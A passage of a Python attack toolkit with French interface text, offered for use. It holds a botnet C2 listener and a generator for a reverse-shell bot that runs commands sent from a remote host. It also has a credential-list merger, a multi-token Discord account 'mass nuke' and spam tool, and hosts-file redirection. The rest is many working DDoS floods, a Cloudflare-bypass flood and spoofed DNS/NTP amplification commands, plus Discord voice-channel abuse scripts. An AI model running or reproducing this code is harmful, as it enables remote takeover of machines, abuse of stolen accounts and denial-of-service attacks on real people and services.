            srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            srv.bind((host, port)); srv.listen(10); srv.settimeout(1)
            while True:
                try:
                    conn, addr = srv.accept()
                    bid = f"bot-{len(bots)+1}"
                    bots[bid] = (conn, addr)
                    print(f"  {G}[NEW BOT]{RST}  {bid} -- {addr[0]}:{addr[1]}")
                    _log_owner_action(f"BOT CONNECT: {addr[0]}")
                except socket.timeout: pass
                except KeyboardInterrupt: break
        except Exception as e: print(f"{ERR} {e}")
        finally:
            for bid,(conn,addr) in bots.items():
                try: conn.close()
                except: pass
            try: srv.close()
            except: pass
        print(f"\n{OK} C2 stoppe. {len(bots)} bots connectes au total.")

    elif c == "2":
        c2_host = input(f"  {W}C2 Host: {RST}").strip()
        c2_port = input(f"  {W}C2 Port: {RST}").strip() or "9001"
        out = input(f"  {W}Output name: {RST}").strip() or "bot.py"
        code = f'''# -*- coding: utf-8 -*-
import socket,subprocess,time,platform,os
C2="{c2_host}"; PORT={c2_port}
def run():
    while True:
        try:
            s=socket.socket(); s.connect((C2,int(PORT)))
            info=f"[BOT] {{platform.node()}} | {{os.getlogin()}} | {{platform.system()}}\\n"
            s.send(info.encode())
            while True:
                cmd=s.recv(4096).decode().strip()
                if not cmd: continue
                if cmd=="exit": break
                out=subprocess.run(cmd,shell=True,capture_output=True,timeout=10)
                s.send(out.stdout+out.stderr or b"(no output)\\n")
            s.close()
        except: time.sleep(10)
run()
'''
        os.makedirs("1-Output/owner", exist_ok=True)
        path = f"1-Output/owner/{out}"
        with open(path,"w",encoding="utf-8") as f: f.write(code)
        print(f"\n{OK} Bot -> {Y}{path}{RST}")
        builder_ask_format(path)
    pause()

def owner_cred_db_builder():
    banner_s("CREDENTIAL DATABASE BUILDER")
    print(f"  {DIM}Fusionne plusieurs listes de credentials en une DB unifiee.{RST}\n")
    files_raw = input(f"  {W}Fichiers (comma separated): {RST}").strip()
    files = [f.strip() for f in files_raw.split(",") if f.strip()]
    out_name = input(f"  {W}Output filename: {RST}").strip() or "cred_db.txt"
    dedup = input(f"  {W}Dedupliquer? (y/n): {RST}").strip().lower() == "y"

    all_lines = []
    for fp in files:
        if os.path.isfile(fp):
            with open(fp, encoding="utf-8", errors="ignore") as f:
                lines = [l.strip() for l in f if l.strip()]
            all_lines.extend(lines)
            print(f"  {OK} {fp} -- {len(lines)} lignes chargees")
        else: print(f"  {ERR} {fp} introuvable")

    if dedup:
        before = len(all_lines)
        all_lines = list(dict.fromkeys(all_lines))
        print(f"  {INF} Deduplique: {before} -> {G}{len(all_lines)}{RST}")

    os.makedirs("1-Output/owner", exist_ok=True)
    path = f"1-Output/owner/{out_name}"
    with open(path,"w",encoding="utf-8") as f: f.write("\n".join(all_lines))
    print(f"\n{OK} DB ({len(all_lines)} entries) -> {Y}{path}{RST}")
    _log_owner_action(f"CRED DB BUILD: {len(all_lines)} entries -> {path}")
    pause()

def owner_discord_mass_nuke():
    banner_s("DISCORD MASS NUKE -- MULTI-TOKENS")
    tokens_path = input(f"  {W}Fichier tokens .txt: {RST}").strip()
    if not os.path.isfile(tokens_path): print(f"{ERR} Fichier introuvable."); pause(); return
    with open(tokens_path, encoding="utf-8", errors="ignore") as f:
        tokens = [l.strip() for l in f if l.strip()]
    print(f"\n{OK} {len(tokens)} tokens charges.")
    print(f"  {Y}[1]{RST} Leave all guilds  {Y}[2]{RST} Delete friends  {Y}[3]{RST} Spam tous les serveurs  {Y}[4]{RST} FULL NUKE")
    mode = input(f"  {W}Mode: {RST}").strip()
    if input(f"\n  {R}[!]{RST} Type {BRT}MASSNUKE{RST} to confirm: ") != "MASSNUKE":
        pause(); return
    spam_msg = ""
    if mode in ["3","4"]: spam_msg = input(f"  {W}Message spam: {RST}").strip()

    for i, token in enumerate(tokens, 1):
        h = _dh(token)
        print(f"\n  {Y}[TOKEN {i}/{len(tokens)}]{RST}")
        try:
            me = requests.get("https://discord.com/api/v9/users/@me", headers=h, timeout=4).json()
            print(f"  {DIM}{me.get('username','?')}{RST}")
            guilds = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=h, timeout=4).json()
            if not isinstance(guilds,list): continue
            if mode in ["1","4"]:
                for g in guilds:
                    if not g.get("owner"):
                        requests.delete(f"https://discord.com/api/v9/users/@me/guilds/{g['id']}", headers=h)
                        print(f"    {Y}[LEAVE]{RST} {g['name']}")
                        time.sleep(0.2)
            if mode in ["2","4"]:
                friends = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=h, timeout=4).json()
                if isinstance(friends,list):
                    for fr in friends:
                        requests.delete(f"https://discord.com/api/v9/users/@me/relationships/{fr['id']}", headers=h)
                        print(f"    {R}[DEL FRIEND]{RST} {fr.get('user',{}).get('username','?')}")
                        time.sleep(0.2)
            if mode in ["3","4"] and spam_msg:
                for g in guilds:
                    channels = requests.get(f"https://discord.com/api/v9/guilds/{g['id']}/channels", headers=h, timeout=4).json()
                    if isinstance(channels,list):
                        for ch in channels:
                            if ch.get("type")==0:
                                requests.post(f"https://discord.com/api/v9/channels/{ch['id']}/messages", headers=h, json={"content":spam_msg})
                                time.sleep(0.1)
        except Exception as e: print(f"    {R}[ERR]{RST} {e}")
        time.sleep(0.5)
    _log_owner_action(f"MASS NUKE: {len(tokens)} tokens mode={mode}")
    print(f"\n{OK} Mass nuke complet.")
    pause()

def owner_dns_info():
    banner_s("DNS POISONING / REDIRECT INFO")
    domain = input(f"  {W}Domaine cible: {RST}").strip()
    print(f"\n  {Y}Techniques de DNS manipulation:{RST}\n")
    print(f"  {G}[1]{RST} {W}Hosts File Poisoning{RST}")
    print(f"  {DIM}  Edite C:\\Windows\\System32\\drivers\\etc\\hosts")
    print(f"  Ajoute: 127.0.0.1 {domain}{RST}\n")
    print(f"  {G}[2]{RST} {W}DNS Cache Poisoning (info){RST}")
    print(f"  {DIM}  Requiert acces au serveur DNS ou MITM")
    print(f"  Outil: dnschef (pip install dnschef){RST}\n")
    print(f"  {G}[3]{RST} {W}Hosts file local (Windows){RST}")
    redirect_to = input(f"\n  {W}Rediriger {domain} vers quelle IP (blank=skip): {RST}").strip()
    if redirect_to:
        hosts_path = r"C:\Windows\System32\drivers\etc\hosts"
        entry = f"127.0.0.1 {domain}\n{redirect_to} {domain}"
        print(f"\n  {Y}Entree a ajouter dans hosts:{RST}")
        print(f"  {G}{entry}{RST}")
        add = input(f"\n  {W}Ajouter au fichier hosts local? (y/n): {RST}").strip().lower()
        if add == "y":
            try:
                with open(hosts_path, "a") as f: f.write(f"\n{redirect_to} {domain}\n")
                print(f"\n{OK} Hosts file modifie.")
                _log_owner_action(f"DNS REDIRECT: {domain} -> {redirect_to}")
            except PermissionError: print(f"{ERR} Admin requis pour editer hosts.")
            except Exception as e: print(f"{ERR} {e}")
    pause()

def owner_log_viewer():
    banner_s("OWNER LOG VIEWER")
    print(f"\n  {Y}Session log ({len(_OWNER_LOG)} entrees):{RST}\n")
    for entry in _OWNER_LOG:
        print(f"  {DIM}{entry}{RST}")
    log_path = "1-Output/owner/owner_log.txt"
    os.makedirs("1-Output/owner", exist_ok=True)
    with open(log_path,"w",encoding="utf-8") as f: f.write("\n".join(_OWNER_LOG))
    print(f"\n{OK} Log sauvegarde -> {Y}{log_path}{RST}")
    pause()

def owner_whitelist_manager():
    banner_s("IP WHITELIST MANAGER")
    wl_path = "1-Output/owner/whitelist.txt"
    os.makedirs("1-Output/owner", exist_ok=True)
    if os.path.isfile(wl_path):
        with open(wl_path, encoding="utf-8") as f:
            ips = [l.strip() for l in f if l.strip()]
    else: ips = []
    print(f"\n  {Y}IPs autorisees ({len(ips)}):{RST}")
    for ip in ips: print(f"  {G}->{RST} {ip}")
    print(f"\n  {Y}[1]{RST} Ajouter  {Y}[2]{RST} Supprimer  {Y}[3]{RST} Verifier mon IP")
    c = input(f"  {W}Choix: {RST}").strip()
    if c == "1":
        ip = input(f"  {W}IP: {RST}").strip(); ips.append(ip)
        with open(wl_path,"w",encoding="utf-8") as f: f.write("\n".join(ips))
        print(f"{OK} {ip} ajoute.")
    elif c == "2":
        ip = input(f"  {W}IP a retirer: {RST}").strip()
        ips = [x for x in ips if x!=ip]
        with open(wl_path,"w",encoding="utf-8") as f: f.write("\n".join(ips))
        print(f"{OK} {ip} retire.")
    elif c == "3":
        try: pub = requests.get("https://api.ipify.org",timeout=4).text.strip()
        except: pub = "?"
        print(f"\n  {Y}Ton IP publique{RST}: {G}{pub}{RST}")
        print(f"  {Y}Dans whitelist {RST}: {G if pub in ips else R}{pub in ips}{RST}")
    pause()

def owner_session_info():
    global _OWNER_SESSION_KEY
    banner_s("SESSION INFO")
    print(f"\n  {Y}Session Key   {RST}: {G}{_OWNER_SESSION_KEY}{RST}")
    print(f"  {Y}Login attempts{RST}: {W}{_OWNER_ATTEMPTS['count']}{RST}")
    print(f"  {Y}Log entries   {RST}: {W}{len(_OWNER_LOG)}{RST}")
    print(f"  {Y}Whitelisted   {RST}: {W}{len(_ALLOWED_IPS)} IPs{RST}")
    kill = input(f"\n  {W}Killer la session? (y/n): {RST}").strip().lower()
    if kill == "y":
        _log_owner_action("SESSION KILLED")
        _OWNER_SESSION_KEY = None
        print(f"{OK} Session killed.")
    pause()

def owner_auto_updater():
    banner_s("AUTO-UPDATER")
    print(f"  {DIM}Verifie et telecharge la derniere version.{RST}\n")
    update_url = input(f"  {W}URL de la derniere version (.py): {RST}").strip()
    if not update_url: print(f"{ERR} URL requise."); pause(); return
    try:
        r = requests.get(update_url, timeout=10)
        if r.status_code == 200:
            print(f"{OK} Fichier recupere ({len(r.content)} bytes)")
            backup_path = "TigerTools_backup.py"
            import shutil
            shutil.copy2("TigerTools.py", backup_path)
            print(f"{OK} Backup -> {backup_path}")
            with open("TigerTools.py","w",encoding="utf-8") as f: f.write(r.text)
            print(f"{OK} Mise a jour appliquee. Redemarrer le tool.")
            _log_owner_action(f"AUTO UPDATE from {update_url}")
        else: print(f"{ERR} HTTP {r.status_code}")
    except Exception as e: print(f"{ERR} {e}")
    pause()

def owner_config_manager():
    banner_s("CONFIG EXPORT / IMPORT")
    print(f"  {Y}[1]{RST} Exporter config (whitelist + log)")
    print(f"  {Y}[2]{RST} Importer config")
    c = input(f"  {W}Mode: {RST}").strip()
    os.makedirs("1-Output/owner", exist_ok=True)
    if c == "1":
        config = {
            "session_key": _OWNER_SESSION_KEY,
            "allowed_ips": _ALLOWED_IPS,
            "log": _OWNER_LOG,
            "export_time": str(_dt.datetime.now())
        }
        path = f"1-Output/owner/config_{int(time.time())}.json"
        with open(path,"w",encoding="utf-8") as f: json.dump(config,f,indent=2)
        print(f"\n{OK} Config exportee -> {Y}{path}{RST}")
        _log_owner_action(f"CONFIG EXPORT: {path}")
    elif c == "2":
        path = input(f"  {W}Fichier config .json: {RST}").strip()
        if os.path.isfile(path):
            with open(path,encoding="utf-8") as f: config=json.load(f)
            _ALLOWED_IPS.extend(config.get("allowed_ips",[]))
            print(f"{OK} Config importee. {len(_ALLOWED_IPS)} IPs whitelistees.")
            _log_owner_action(f"CONFIG IMPORT: {path}")
        else: print(f"{ERR} Fichier introuvable.")
    pause()


# ================================================================
# DDOS AVANCE + VC DISCORD TOOLS
# ================================================================

def ddos_advanced_menu():
    while True:
        opts=[("1","UDP Flood (Layer 4)"),("2","TCP SYN Flood"),
              ("3","HTTP GET Flood (Layer 7)"),("4","Slowloris"),
              ("5","Multi-thread UDP Flood"),("6","ICMP Flood (ping flood)"),
              ("7","DNS Amplification Info"),("8","HTTP POST Flood"),
              ("9","Rudy Attack (R-U-Dead-Yet)"),("10","NTP Amplification Info"),
              ("11","WebSocket Flood"),("12","Bypass Cloudflare (L7)"),
              ("13","Mixed Protocol Flood"),("0","Back")]
        menu_box("DDOS AVANCE",opts)
        c=input(f"  {R}>{RST} ").strip()
        if c=="1": ddos_udp()
        elif c=="2": ddos_tcp()
        elif c=="3": ddos_http()
        elif c=="4": ddos_slowloris()
        elif c=="5": ddos_udp_threaded()
        elif c=="6": ddos_icmp()
        elif c=="7": ddos_dns_amp_info()
        elif c=="8": ddos_http_post()
        elif c=="9": ddos_rudy()
        elif c=="10": ddos_ntp_info()
        elif c=="11": ddos_websocket()
        elif c=="12": ddos_cf_bypass()
        elif c=="13": ddos_mixed()
        elif c=="0": break

def ddos_icmp():
    banner_s("ICMP FLOOD -- PING FLOOD")
    host=input(f"  {W}Target IP: {RST}").strip()
    duration=int(input(f"  {W}Duration (s): {RST}").strip() or "10")
    print(f"\n{INF} ICMP flood -> {Y}{host}{RST} pour {duration}s...\n")
    print(f"  {DIM}(requiert admin/root pour raw socket){RST}")
    end=time.time()+duration; sent=0
    try:
        # Try raw ICMP
        try:
            sock=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_ICMP)
            # ICMP echo request packet
            import struct
            def make_icmp():
                icmp_type=8; code=0; checksum=0; identifier=random.randint(1,65535); seq=1
                header=struct.pack("bbHHh",icmp_type,code,checksum,identifier,seq)
                data=b"TigerFlood"*10
                # compute checksum
                s=0
                for i in range(0,len(header+data),2):
                    w=(header+data)[i]+(header+data)[i+1]<<8 if i+1<len(header+data) else (header+data)[i]
                    s+=w
                s=(s>>16)+(s&0xffff); s+=s>>16; checksum=~s&0xffff
                header=struct.pack("bbHHh",icmp_type,code,checksum,identifier,seq)
                return header+data
            while time.time()<end:
                sock.sendto(make_icmp(),(host,0)); sent+=1
                if sent%1000==0: print(f"  {G}[~]{RST} {sent} paquets ICMP envoyes")
        except PermissionError:
            # Fallback: subprocess ping flood
            print(f"  {Y}[!]{RST} Raw socket refuse -- utilise ping en boucle")
            param="-n" if platform.system()=="Windows" else "-c"
            while time.time()<end:
                subprocess.run(["ping",param,"1",host],capture_output=True); sent+=1
    except KeyboardInterrupt: pass
    print(f"\n{OK} Done. {sent} paquets ICMP.")
    pause()

def ddos_dns_amp_info():
    banner_s("DNS AMPLIFICATION INFO")
    print(f"""
  {Y}DNS Amplification Attack{RST}
  {DIM}Principe: envoie des requetes DNS avec IP source spoofee vers
  des resolvers ouverts -- le resolver repond a la victime
  avec un paquet beaucoup plus gros (amplification x50-x100){RST}

  {Y}Etapes:{RST}
  {G}1.{RST} Trouver des open resolvers DNS
  {G}2.{RST} Forger des paquets UDP avec IP source = target
  {G}3.{RST} Requete ANY sur un gros domaine (ex: isc.org)
  {G}4.{RST} Le resolver repond a la victime (amplification)

  {Y}Tools:{RST}
  {G}->{RST} {W}masscan{RST}     -- scanner des open resolvers
  {G}->{RST} {W}hping3{RST}      -- forge paquets UDP spoofes
  {G}->{RST} {W}scapy{RST}       -- python, forge tout
  {G}->{RST} {W}nmap -sU -p53{RST} -- detecte open resolvers

  {Y}Commande scapy:{RST}
  {DIM}from scapy.all import *
  send(IP(src="VICTIM_IP",dst="OPEN_RESOLVER")/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname="isc.org",qtype="ANY")),loop=1){RST}

  {Y}Amplification factor:{RST} {G}x50 a x100{RST}
  {Y}Mitigation victime:{RST}   {DIM}Firewall UDP/53 entrant{RST}
""")
    pause()

def ddos_http_post():
    banner_s("HTTP POST FLOOD -- Layer 7")
    url=input(f"  {W}Target URL: {RST}").strip()
    duration=int(input(f"  {W}Duration (s): {RST}").strip() or "10")
    threads_n=int(input(f"  {W}Threads: {RST}").strip() or "50")
    print(f"\n{INF} HTTP POST flood -> {Y}{url}{RST} pour {duration}s | {threads_n} threads\n")
    stop={"v":False}; sent_total=[0]
    ua_list=["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/537.36",
             "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
             "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1",
             "Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0"]
    def flood():
        while not stop["v"]:
            try:
                ua=random.choice(ua_list)
                # Random POST data
                data={"field"+str(random.randint(1,10)):
                      "".join(random.choices(string.ascii_letters,k=random.randint(100,1000)))}
                requests.post(url,data=data,
                             headers={"User-Agent":ua,
                                      "X-Forwarded-For":".".join(str(random.randint(1,254)) for _ in range(4)),
                                      "X-Real-IP":".".join(str(random.randint(1,254)) for _ in range(4))},
                             timeout=2)
                sent_total[0]+=1
            except: pass
    threads_list=[threading.Thread(target=flood,daemon=True) for _ in range(threads_n)]
    for t in threads_list: t.start()
    try:
        end=time.time()+duration
        while time.time()<end:
            print(f"\r  {G}[~]{RST} {sent_total[0]} POST requests | threads:{threads_n}",end="")
            time.sleep(0.5)
    except KeyboardInterrupt: pass
    stop["v"]=True
    print(f"\n\n{OK} Done. {sent_total[0]} POST requests.")
    pause()

def ddos_rudy():
    banner_s("RUDY ATTACK -- R-U-Dead-Yet (Slow POST)")
    host=input(f"  {W}Target host: {RST}").strip()
    port=int(input(f"  {W}Port: {RST}").strip() or "80")
    path=input(f"  {W}Path (ex: /login): {RST}").strip() or "/"
    sockets_n=int(input(f"  {W}Sockets: {RST}").strip() or "100")
    duration=int(input(f"  {W}Duration (s): {RST}").strip() or "30")
    print(f"\n{INF} RUDY -> {Y}{host}:{port}{path}{RST} | {sockets_n} sockets | {duration}s\n")
    socks=[]; end=time.time()+duration
    def open_socket():
        try:
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.settimeout(4); s.connect((host,port))
            # Send POST header with huge Content-Length
            content_length=1000000  # 1MB
            req=(f"POST {path} HTTP/1.1\r\n"
                 f"Host: {host}\r\n"
                 f"Content-Type: application/x-www-form-urlencoded\r\n"
                 f"Content-Length: {content_length}\r\n"
                 f"User-Agent: Mozilla/5.0\r\n"
                 f"Connection: keep-alive\r\n\r\n")
            s.send(req.encode())
            return s
        except: return None
    print(f"{INF} Ouverture de {sockets_n} connexions lentes...")
    for _ in range(sockets_n):
        s=open_socket()
        if s: socks.append(s)
    print(f"{OK} {len(socks)} connexions ouvertes.")
    try:
        while time.time()<end:
            alive=[]
            for s in socks:
                try:
                    # Send 1 byte of body every 10s -- tres lent
                    s.send(b"X")
                    alive.append(s)
                except:
                    ns=open_socket()
                    if ns: alive.append(ns)
            socks[:]=alive
            print(f"\r  {G}[~]{RST} {len(socks)} connexions lentes actives",end="")
            time.sleep(10)
    except KeyboardInterrupt: pass
    for s in socks:
        try: s.close()
        except: pass
    print(f"\n\n{OK} RUDY termine.")
    pause()

def ddos_ntp_info():
    banner_s("NTP AMPLIFICATION INFO")
    print(f"""
  {Y}NTP Amplification Attack{RST}
  {DIM}Principe: utilise la commande MONLIST des serveurs NTP
  qui repond avec la liste des 600 derniers clients
  Amplification: x556 (un paquet 46 bytes -> 48KB de reponse){RST}

  {Y}Commande ntpdc:{RST}
  {DIM}ntpdc -n -c monlist NTP_SERVER{RST}

  {Y}Avec hping3 (spoofed):{RST}
  {DIM}hping3 --udp -p 123 --spoof VICTIM_IP NTP_SERVER{RST}

  {Y}Avec scapy:{RST}
  {DIM}from scapy.all import *
  send(IP(src="VICTIM_IP",dst="NTP_SERVER")/UDP(dport=123)/Raw(load="\x17\x00\x03\x2a"+"\x00"*4),loop=1){RST}

  {Y}Trouver des serveurs NTP vulnerables:{RST}
  {G}->{RST} {DIM}shodan.io/search?query=port:123+ntp.monlist{RST}
  {G}->{RST} {DIM}masscan -p 123 --rate 10000 IP_RANGE{RST}

  {Y}Amplification factor:{RST} {G}x556{RST}
  {Y}NTP version cible:{RST}    {DIM}ntpd < 4.2.7{RST}
""")
    pause()

def ddos_websocket():
    banner_s("WEBSOCKET FLOOD")
    url=input(f"  {W}WebSocket URL (ws:// ou wss://): {RST}").strip()
    duration=int(input(f"  {W}Duration (s): {RST}").strip() or "10")
    connections=int(input(f"  {W}Connexions simultanees: {RST}").strip() or "50")
    try:
        import websocket as ws_lib
    except ImportError:
        pip("websocket-client"); import websocket as ws_lib
    print(f"\n{INF} WebSocket flood -> {Y}{url}{RST} | {connections} conns | {duration}s\n")
    stop={"v":False}; sent_total=[0]
    def flood():
        try:
            ws=ws_lib.create_connection(url,timeout=5)
            while not stop["v"]:
                try:
                    msg="".join(random.choices(string.ascii_letters,k=512))
                    ws.send(msg); sent_total[0]+=1
                except: break
            try: ws.close()
            except: pass
        except: pass
    threads_list=[threading.Thread(target=flood,daemon=True) for _ in range(connections)]
    for t in threads_list: t.start()
    try:
        end=time.time()+duration
        while time.time()<end:
            print(f"\r  {G}[~]{RST} {sent_total[0]} messages WS envoyes",end="")
            time.sleep(0.5)
    except KeyboardInterrupt: pass
    stop["v"]=True
    print(f"\n\n{OK} Done. {sent_total[0]} messages WebSocket.")
    pause()

def ddos_cf_bypass():
    banner_s("BYPASS CLOUDFLARE -- L7")
    url=input(f"  {W}URL cible (derriere Cloudflare): {RST}").strip()
    duration=int(input(f"  {W}Duration (s): {RST}").strip() or "10")
    threads_n=int(input(f"  {W}Threads: {RST}").strip() or "30")
    print(f"\n{INF} CF Bypass -> {Y}{url}{RST} pour {duration}s | {threads_n} threads\n")
    # Techniques de bypass Cloudflare
    cf_headers=[
        {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
         "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
         "Accept-Language":"fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
         "Accept-Encoding":"gzip, deflate, br",
         "Connection":"keep-alive","Cache-Control":"no-cache",
         "Pragma":"no-cache","DNT":"1",
         "Upgrade-Insecure-Requests":"1",
         "X-Forwarded-For":".".join(str(random.randint(1,254)) for _ in range(4))},
        {"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
         "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
         "Accept-Language":"en-us,en;q=0.5","Connection":"keep-alive",
         "X-Real-IP":".".join(str(random.randint(1,254)) for _ in range(4))},
    ]
    stop={"v":False}; sent_total=[0]; blocked=[0]
    def flood():
        sess=requests.Session()
        while not stop["v"]:
            try:
                h=random.choice(cf_headers).copy()
                h["X-Forwarded-For"]=".".join(str(random.randint(1,254)) for _ in range(4))
                r=sess.get(url,headers=h,timeout=3)
                sent_total[0]+=1
                if r.status_code in [403,429,503]: blocked[0]+=1
            except: pass
    threads_list=[threading.Thread(target=flood,daemon=True) for _ in range(threads_n)]
    for t in threads_list: t.start()
    try:
        end=time.time()+duration
        while time.time()<end:
            print(f"\r  {G}[~]{RST} {sent_total[0]} req | bloquees:{R}{blocked[0]}{RST} | passes:{G}{sent_total[0]-blocked[0]}{RST}",end="")
            time.sleep(0.5)
    except KeyboardInterrupt: pass
    stop["v"]=True
    bypass_rate=((sent_total[0]-blocked[0])/max(sent_total[0],1))*100
    print(f"\n\n{OK} Done. {sent_total[0]} requetes | Bypass rate: {G}{bypass_rate:.1f}%{RST}")
    pause()

def ddos_mixed():
    banner_s("MIXED PROTOCOL FLOOD")
    host=input(f"  {W}Target IP: {RST}").strip()
    duration=int(input(f"  {W}Duration (s): {RST}").strip() or "15")
    threads_per_proto=int(input(f"  {W}Threads par protocole: {RST}").strip() or "10")
    print(f"\n{INF} Mixed flood -> {Y}{host}{RST} | {threads_per_proto*3} threads total | {duration}s\n")
    stop={"v":False}; counters={"udp":0,"tcp":0,"http":0}
    def udp_flood():
        s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        payload=random._urandom(1024)
        while not stop["v"]:
            try:
                port=random.randint(1,65535)
                s.sendto(payload,(host,port)); counters["udp"]+=1
            except: pass
        s.close()
    def tcp_flood():
        while not stop["v"]:
            try:
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.settimeout(0.1)
                port=random.randint(1,65535)
                s.connect_ex((host,port)); s.close(); counters["tcp"]+=1
            except: pass
    def http_flood():
        while not stop["v"]:
            try:
                for port in [80,443,8080]:
                    requests.get(f"http://{host}:{port}",timeout=1,
                                headers={"User-Agent":"Mozilla/5.0"})
                    counters["http"]+=1
            except: pass
    all_threads=[]
    for _ in range(threads_per_proto):
        all_threads.append(threading.Thread(target=udp_flood,daemon=True))
        all_threads.append(threading.Thread(target=tcp_flood,daemon=True))
        all_threads.append(threading.Thread(target=http_flood,daemon=True))
    for t in all_threads: t.start()
    try:
        end=time.time()+duration
        while time.time()<end:
            total=sum(counters.values())
            print(f"\r  {G}[~]{RST} UDP:{Y}{counters['udp']}{RST} TCP:{Y}{counters['tcp']}{RST} HTTP:{Y}{counters['http']}{RST} Total:{G}{total}{RST}",end="")
            time.sleep(0.5)
    except KeyboardInterrupt: pass
    stop["v"]=True
    print(f"\n\n{OK} Mixed flood done. Total: {sum(counters.values())} paquets/reqs.")
    pause()

# ================================================================
# VC DISCORD TOOLS
# ================================================================
def vc_discord_menu():
    while True:
        opts=[("1","VC Joiner (rejoindre un vocal)"),
              ("2","VC Spammer (join/leave en boucle)"),
              ("3","VC Mass Joiner (multi-tokens)"),
              ("4","VC Screenshare Joiner"),
              ("5","VC Channel Lister"),
              ("6","VC Mute/Deafen Everyone (bot)"),
              ("7","VC Disconnect Everyone (bot)"),
              ("8","VC Move All Users"),
              ("9","VC Flood (creer canaux vocaux)"),
              ("0","Back")]
        menu_box("VC DISCORD TOOLS",opts)
        c=input(f"  {R}>{RST} ").strip()
        if c=="1": vc_joiner()
        elif c=="2": vc_spammer_loop()
        elif c=="3": vc_mass_joiner()
        elif c=="4": vc_screenshare()
        elif c=="5": vc_channel_lister()
        elif c=="6": vc_mute_everyone()
        elif c=="7": vc_disconnect_everyone()
        elif c=="8": vc_move_all()
        elif c=="9": vc_flood()
        elif c=="0": break

def vc_joiner():
    banner_s("VC JOINER")
    token=input(f"  {W}Token: {RST}").strip()
    guild_id=input(f"  {W}Server ID: {RST}").strip()
    channel_id=input(f"  {W}Voice Channel ID: {RST}").strip()
    h=_dh(token)
    # Use voice state update
    r=requests.patch(
        f"https://discord.com/api/v9/guilds/{guild_id}/voice-states/@me",
        headers=h,json={"channel_id":channel_id,"suppress":False}
    )
    print(f"\n{OK if r.status_code in [200,204] else ERR} Join VC ({r.status_code})")
    if r.status_code not in [200,204]:
        # Try alternate endpoint
        r2=requests.put(
            f"https://discord.com/api/v9/guilds/{guild_id}/voice-states/@me",
            headers=h,json={"channel_id":channel_id}
        )
        print(f"  {DIM}Alt endpoint: {r2.status_code}{RST}")
    pause()

def vc_spammer_loop():
    banner_s("VC SPAMMER -- JOIN/LEAVE LOOP")
    token=input(f"  {W}Token: {RST}").strip()
    guild_id=input(f"  {W}Server ID: {RST}").strip()
    channel_id=input(f"  {W}Voice Channel ID: {RST}").strip()
    count=int(input(f"  {W}Nombre de join/leave: {RST}").strip() or "20")
    delay=float(input(f"  {W}Delay (s): {RST}").strip() or "1")
    h=_dh(token); print()
    for i in range(1,count+1):
        # JOIN
        r=requests.patch(
            f"https://discord.com/api/v9/guilds/{guild_id}/voice-states/@me",
            headers=h,json={"channel_id":channel_id,"suppress":False}
        )
        print(f"  {G}[JOIN  {i}/{count}]{RST}  {r.status_code}")
        time.sleep(delay)
        # LEAVE
        r2=requests.patch(
            f"https://discord.com/api/v9/guilds/{guild_id}/voice-states/@me",
            headers=h,json={"channel_id":None}
        )
        print(f"  {Y}[LEAVE {i}/{count}]{RST}  {r2.status_code}")
        time.sleep(delay)
    print(f"\n{OK} VC spam termine.")
    pause()

def vc_mass_joiner():
    banner_s("VC MASS JOINER -- MULTI TOKENS")
    tokens_path=input(f"  {W}Fichier tokens .txt: {RST}").strip()
    if not os.path.isfile(tokens_path): print(f"{ERR} Introuvable."); pause(); return
    with open(tokens_path,encoding="utf-8",errors="ignore") as f:
        tokens=[l.strip() for l in f if l.strip()]
    guild_id=input(f"  {W}Server ID: {RST}").strip()
    channel_id=input(f"  {W}Voice Channel ID: {RST}").strip()
    print(f"\n{INF} Jointure de {len(tokens)} tokens dans le VC...\n")
    joined=0
    for i,token in enumerate(tokens,1):
        h=_dh(token)
        # Verify token first
        me=requests.get("https://discord.com/api/v9/users/@me",headers=h,timeout=3)
        if me.status_code!=200:
            print(f"  {R}[DEAD]{RST}  token {i}"); continue
        uname=me.json().get("username","?")
        # Join server if not already
        # Then join VC
        r=requests.patch(
            f"https://discord.com/api/v9/guilds/{guild_id}/voice-states/@me",
            headers=h,json={"channel_id":channel_id,"suppress":False}
        )
        col=G if r.status_code in [200,204] else R
        print(f"  {col}[{i}/{len(tokens)}]{RST}  {W}{uname}{RST}  VC join: {r.status_code}")
        joined+=1
        time.sleep(0.5)
    print(f"\n{OK} {G}{joined}{RST} tokens dans le VC.")
    pause()

def vc_screenshare():
    banner_s("VC SCREENSHARE JOINER")
    token=input(f"  {W}Token: {RST}").strip()
    channel_id=input(f"  {W}Voice Channel ID: {RST}").strip()
    guild_id=input(f"  {W}Server ID: {RST}").strip()
    h=_dh(token)
    # Start screenshare stream
    r=requests.post(
        f"https://discord.com/api/v9/channels/{channel_id}/call/ring",
        headers=h,json={}
    )
    print(f"\n  {DIM}Ring status: {r.status_code}{RST}")
    # Video state update
    r2=requests.patch(
        f"https://discord.com/api/v9/guilds/{guild_id}/voice-states/@me",
        headers=h,json={"channel_id":channel_id,"suppress":False,"self_video":True,"self_stream":True}
    )
    print(f"\n{OK if r2.status_code in [200,204] else ERR} Screenshare join: {r2.status_code}")
    pause()

def vc_channel_lister():
    banner_s("VC CHANNEL LISTER")
    token=input(f"  {W}Token: {RST}").strip()
